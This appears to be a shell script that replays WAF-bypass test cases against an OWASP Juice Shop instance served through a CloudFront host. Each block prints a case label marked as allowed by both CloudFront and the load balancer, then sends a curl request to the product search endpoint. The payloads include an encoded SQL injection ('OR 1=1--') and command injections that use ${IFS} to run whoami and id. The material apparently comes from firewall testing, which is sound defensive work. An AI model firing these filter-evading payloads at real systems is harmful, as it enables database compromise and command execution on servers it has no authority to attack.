curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%2527%252F%2A%2A%252FOR%252F%2A%2A%252F1%253D1--' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0339 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=xss ==="
printf '    payload: %s\n' ''\''||'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%27%7C%7C' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0342 | verdict=CF_ALLOW_ALB_ALLOW | http=200 | tuning=cmdi ==="
printf '    payload: %s\n' 'sh$\{IFS\}-c$\{IFS\}whoami'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=sh%24%5C%7BIFS%5C%7D-c%24%5C%7BIFS%5C%7Dwhoami' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0343 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=cmdi ==="
printf '    payload: %s\n' 'bash$\{IFS\}-c$\{IFS\}'\''id'\'''
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=bash%24%5C%7BIFS%5C%7D-c%24%5C%7BIFS%5C%7D%27id%27' -H "User-Agent: $USER_AGENT" | head -8
echo
echo "=== juiceshop-0344 | verdict=CF_ALLOW_ALB_ALLOW | http=500 | tuning=cmdi ==="
printf '    payload: %s\n' '$\{IFS\}'\''id'\''}'
curl -sk -i -m 15 'https://dlpaasrngb6ue.cloudfront.net/rest/products/search?q=%24%5C%7BIFS%5C%7D%27id%27%7D' -H "User-Agent: $USER_AGENT" | head -8
